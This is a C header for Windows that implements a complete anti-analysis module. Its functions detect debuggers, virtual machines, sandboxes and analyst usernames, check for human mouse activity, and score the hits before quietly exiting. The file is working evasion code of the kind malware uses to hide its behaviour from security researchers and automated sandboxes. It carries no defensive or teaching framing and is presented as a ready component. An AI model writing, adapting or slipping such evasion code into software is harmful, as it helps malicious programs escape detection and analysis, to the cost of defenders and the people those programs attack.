#ifndef ANTI_ANALYSIS_H
#define ANTI_ANALYSIS_H

#include <windows.h>
#include <winternl.h> 
#include <intrin.h>   
#include <setupapi.h> 
#include <cfgmgr32.h> 
#include <iphlpapi.h> 
#include <shlwapi.h>  

#pragma comment(lib, "setupapi.lib")
#pragma comment(lib, "iphlpapi.lib")
#pragma comment(lib, "shlwapi.lib")
#pragma comment(lib, "ws2_32.lib")

typedef int (WINAPI* MESSAGEBOXA)(HWND, LPCSTR, LPCSTR, UINT);

// --- HELPER FOR DEBUG LOGGING ---
void ShowDetectionMessage(MESSAGEBOXA pMessageBoxA, const char* message) {
    if (pMessageBoxA) {
        // THIS LINE IS NOW CORRECT
        pMessageBoxA(NULL, message, "ANTI-ANALYSIS DETECTION", MB_OK | MB_ICONWARNING);
    }
}

// --- ANTI-DEBUGGING ---
bool CheckDebuggerPEB() {
#ifdef _WIN64
    PPEB pPeb = (PPEB)__readgsqword(0x60);
#else
    PPEB pPeb = (PPEB)__readfsdword(0x30);
#endif
    return pPeb->BeingDebugged;
}

bool CheckRemoteDebugger() {
    BOOL isDebuggerPresent = FALSE;
    CheckRemoteDebuggerPresent(GetCurrentProcess(), &isDebuggerPresent);
    return isDebuggerPresent;
}

bool CheckTiming() {
    ULONGLONG startTick = GetTickCount64();
    Sleep(500);
    ULONGLONG endTick = GetTickCount64();
    return (endTick - startTick) > 1000;
}

bool CheckHardwareBreakpoints() {
    CONTEXT ctx = {};
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
    if (GetThreadContext(GetCurrentThread(), &ctx)) {
        return (ctx.Dr0 != 0 || ctx.Dr1 != 0 || ctx.Dr2 != 0 || ctx.Dr3 != 0);
    }
    return false;
}

// --- ANTI-VM/SANDBOX ---
bool DetectVMDiskAndGraphics() {
    bool diskDetected = false;
    bool graphicsDetected = false;
    const GUID GUID_DEVINTERFACE_DISK = { 0x53f56307, 0xb6bf, 0x11d0, {0x94, 0xf2, 0x00, 0xa0, 0xc9, 0x1e, 0xfb, 0x8b} };
    HDEVINFO hDevInfo = SetupDiGetClassDevsA(&GUID_DEVINTERFACE_DISK, 0, 0, DIGCF_PRESENT | DIGCF_DEVICEINTERFACE);
    if (hDevInfo != INVALID_HANDLE_VALUE) {
        SP_DEVINFO_DATA devInfo = { sizeof(SP_DEVINFO_DATA) };
        char buf[512];
        for (DWORD i = 0; SetupDiEnumDeviceInfo(hDevInfo, i, &devInfo); i++) {
            if (CM_Get_Device_IDA(devInfo.DevInst, buf, sizeof(buf), 0) == CR_SUCCESS) {
                _strlwr_s(buf, sizeof(buf));
                if (strstr(buf, "qemu") || strstr(buf, "vbox") || strstr(buf, "vmware")) {
                    diskDetected = true;
                    break;
                }
            }
        }
        SetupDiDestroyDeviceInfoList(hDevInfo);
    }
    const GUID GUID_DEVINTERFACE_VIDEO = { 0x4d36e968, 0xe325, 0x11ce, {0xbf, 0xc1, 0x08, 0x00, 0x2b, 0xe1, 0x03, 0x18} };
    hDevInfo = SetupDiGetClassDevsA(&GUID_DEVINTERFACE_VIDEO, 0, 0, DIGCF_PRESENT);
    if (hDevInfo != INVALID_HANDLE_VALUE) {
        SP_DEVINFO_DATA devInfo = { sizeof(SP_DEVINFO_DATA) };
        char buf[512];
        for (DWORD i = 0; SetupDiEnumDeviceInfo(hDevInfo, i, &devInfo); i++) {
            if (CM_Get_Device_IDA(devInfo.DevInst, buf, sizeof(buf), 0) == CR_SUCCESS) {
                 _strlwr_s(buf, sizeof(buf));
                if (strstr(buf, "virtualbox") || strstr(buf, "vmware") || strstr(buf, "qemu")) {
                    graphicsDetected = true;
                    break;
                }
            }
        }
        SetupDiDestroyDeviceInfoList(hDevInfo);
    }
    return diskDetected && graphicsDetected;
}

bool CheckHypervisor() {
    int cpuInfo[4];
    __cpuid(cpuInfo, 1);
    return (cpuInfo[2] & (1 << 31)) != 0;
}

bool CheckMAC() {
    unsigned char vmMacs[][3] = { {0x00, 0x05, 0x69}, {0x00, 0x0C, 0x29}, {0x00, 0x1C, 0x14}, {0x00, 0x50, 0x56}, {0x08, 0x00, 0x27} };
    PIP_ADAPTER_INFO pAdapterInfo = NULL;
    ULONG ulOutBufLen = 0;
    if (GetAdaptersInfo(pAdapterInfo, &ulOutBufLen) == ERROR_BUFFER_OVERFLOW) {
        pAdapterInfo = (IP_ADAPTER_INFO*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, ulOutBufLen);
        if (pAdapterInfo == NULL) return false;
    }
    if (GetAdaptersInfo(pAdapterInfo, &ulOutBufLen) == NO_ERROR) {
        for (PIP_ADAPTER_INFO pAdapter = pAdapterInfo; pAdapter; pAdapter = pAdapter->Next) {
            for (int i = 0; i < (sizeof(vmMacs) / 3); i++) {
                if (memcmp(pAdapter->Address, vmMacs[i], 3) == 0) {
                    HeapFree(GetProcessHeap(), 0, pAdapterInfo);
                    return true;
                }
            }
        }
    }
    if (pAdapterInfo) HeapFree(GetProcessHeap(), 0, pAdapterInfo);
    return false;
}

bool CheckForKVM() {
    const char* badDrivers[] = {"balloon.sys", "netkvm.sys", "vioinput.sys", "viofs.sys", "vioser.sys"};
    char systemRoot[MAX_PATH];
    char driverPath[MAX_PATH];
    if (GetEnvironmentVariableA("SystemRoot", systemRoot, MAX_PATH) == 0) return false;
    for (int i = 0; i < (sizeof(badDrivers) / sizeof(LPCSTR)); i++) {
        wsprintfA(driverPath, "%s\\System32\\drivers\\%s", systemRoot, badDrivers[i]);
        if (PathFileExistsA(driverPath)) return true;
    }
    return false;
}

bool CheckForBlacklistedNames() {
    const char* blacklistedNames[] = {"Johnson", "Miller", "malware", "maltest", "CurrentUser", "Sandbox", "virus", "John Doe", "test user", "sand box", "WDAGUtilityAccount"};
    char usernameA[MAX_PATH];
    DWORD size = MAX_PATH;
    GetUserNameA(usernameA, &size);
    _strlwr_s(usernameA, sizeof(usernameA));
    for (int i = 0; i < (sizeof(blacklistedNames) / sizeof(LPCSTR)); i++) {
        char currentName[MAX_PATH];
        strcpy_s(currentName, sizeof(currentName), blacklistedNames[i]);
        _strlwr_s(currentName, sizeof(currentName));
        if (strcmp(usernameA, currentName) == 0) return true;
    }
    return false;
}

bool IsScreenSmall() {
    return (GetSystemMetrics(SM_CXSCREEN) < 801 || GetSystemMetrics(SM_CYSCREEN) < 601);
}

bool CheckConnection() {
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) return true;
    SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (sock == INVALID_SOCKET) { WSACleanup(); return true; }
    struct hostent* host = gethostbyname("8.8.8.8");
    if (host == NULL) { closesocket(sock); WSACleanup(); return true; }
    SOCKADDR_IN addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(53);
    addr.sin_addr.s_addr = *((unsigned long*)host->h_addr);
    bool connected = (connect(sock, (SOCKADDR*)&addr, sizeof(addr)) != SOCKET_ERROR);
    closesocket(sock);
    WSACleanup();
    return !connected;
}

bool WaitForHumanActivity(DWORD maxWaitMilliseconds) {
    POINT initialPos = {0};
    GetCursorPos(&initialPos);
    ULONGLONG startTime = GetTickCount64();
    while ((GetTickCount64() - startTime) < maxWaitMilliseconds) {
        POINT currentPos = {0};
        GetCursorPos(&currentPos);
        if (currentPos.x != initialPos.x || currentPos.y != initialPos.y) return TRUE;
        Sleep(2000);
    }
    return FALSE;
}

// --- MASTER FUNCTION ---
void PerformAntiAnalysisChecks(MESSAGEBOXA pMessageBoxA) {
    int detection_points = 0;
    const int threshold = 2;
    if (IsDebuggerPresent() || CheckDebuggerPEB()) {
        ShowDetectionMessage(pMessageBoxA, "DETECTION: IsDebuggerPresent or PEB Flag");
        detection_points += 2;
    }
    if (detection_points >= threshold) ExitProcess(0);
    if (CheckRemoteDebugger()) {
        ShowDetectionMessage(pMessageBoxA, "DETECTION: Remote Debugger Present");
        detection_points += 2;
    }
    if (detection_points >= threshold) ExitProcess(0);
    if (CheckHardwareBreakpoints()) {
        ShowDetectionMessage(pMessageBoxA, "DETECTION: Hardware Breakpoints Set");
        detection_points += 3;
    }
    if (detection_points >= threshold) ExitProcess(0);
    if (CheckHypervisor()) {
        ShowDetectionMessage(pMessageBoxA, "DETECTION: Hypervisor CPU Bit");
        detection_points++;
    }
    if (detection_points >= threshold) ExitProcess(0);
    if (IsScreenSmall()) {
        ShowDetectionMessage(pMessageBoxA, "DETECTION: Small Screen Resolution");
        detection_points++;
    }
    if (detection_points >= threshold) ExitProcess(0);
    if (CheckMAC()) {
        ShowDetectionMessage(pMessageBoxA, "DETECTION: VM-related MAC Address");
        detection_points++;
    }
    if (detection_points >= threshold) ExitProcess(0);
    if (CheckForBlacklistedNames()) {
        ShowDetectionMessage(pMessageBoxA, "DETECTION: Blacklisted Username");
        detection_points++;
    }
    if (detection_points >= threshold) ExitProcess(0);
    if (DetectVMDiskAndGraphics()) {
        ShowDetectionMessage(pMessageBoxA, "DETECTION: VM Disk and Graphics Artifacts");
        detection_points += 2;
    }
    if (detection_points >= threshold) ExitProcess(0);
    if (CheckForKVM()) {
        ShowDetectionMessage(pMessageBoxA, "DETECTION: KVM Driver Artifacts");
        detection_points++;
    }
    if (detection_points >= threshold) ExitProcess(0);
    if (CheckTiming()) {
        ShowDetectionMessage(pMessageBoxA, "DETECTION: Debugger Timing Anomaly");
        detection_points++;
    }
    if (detection_points >= threshold) ExitProcess(0);
    if (CheckConnection()) {
        ShowDetectionMessage(pMessageBoxA, "DETECTION: No Internet Connection");
        detection_points++;
    }
    if (detection_points >= threshold) ExitProcess(0);
    if (!WaitForHumanActivity(300000)) {
        ShowDetectionMessage(pMessageBoxA, "DETECTION: User Activity Timeout (5 Minutes)");
        detection_points += 3;
    }
    if (detection_points >= threshold) ExitProcess(0);
}

#endif // ANTI_ANALYSIS_H